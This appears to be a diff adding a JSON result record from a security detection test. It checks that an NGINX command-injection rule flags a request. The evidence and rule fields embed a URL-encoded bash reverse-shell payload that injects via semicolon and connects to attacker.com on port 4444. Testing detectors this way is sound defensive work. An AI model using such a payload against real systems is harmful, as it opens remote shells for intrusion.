@@ -1,0 +1,17 @@
+{
+  "pattern_id": "CMD_BASH_004",
+  "test_id": "CMD_BASH_004-1771076172912-304tgl",
+  "category": "cmdi",
+  "detected": true,
+  "expected_detection": true,
+  "latency_ms": 41000,
+  "evidence": "13:36:12.000000000: Critical [NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1771076172912-304tgl pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1",
+  "rule_name": "[NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1771076172912-304tgl pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1",
+  "expected_rule": "[NGINX CMDi] Command injection via semicolon",
+  "rule_id": "",
+  "rule_match": true,
+  "matched_rule": "[NGINX CMDi] Command injection via semicolon test_id=CMD_BASH_004-1771076172912-304tgl pattern_id=CMD_BASH_004 uri=/?q=%3B%20exec%205%3C%3E%2Fdev%2Ftcp%2Fattacker.com%2F4444%3Bcat%20%3C%265%20%7C%20while%20read%20line%3B%20do%20%24line%202%3E%265%20%3E%265%3B%20done client=127.0.0.1",
+  "sent_at": 1771076213000,
+  "detected_at": 1771076172000,
+  "status": "passed"
+}
